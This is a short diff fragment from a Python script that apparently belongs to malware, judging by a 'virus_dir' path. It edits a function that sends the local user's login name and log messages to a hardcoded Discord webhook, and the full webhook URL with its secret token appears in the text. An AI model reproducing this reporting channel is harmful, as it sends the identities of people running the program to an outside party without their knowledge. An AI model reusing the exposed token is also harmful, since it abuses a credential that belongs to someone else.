@@ -13,7 +13,7 @@ virus_dir = os.path.join(
 )
 
 def log_to_discord(msg:str):
-    data = {"username":os.getlogin(), "content":msg}
+    data = {"username":f"User:{os.getlogin()}", "content":msg}
     try:
         requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
     except:
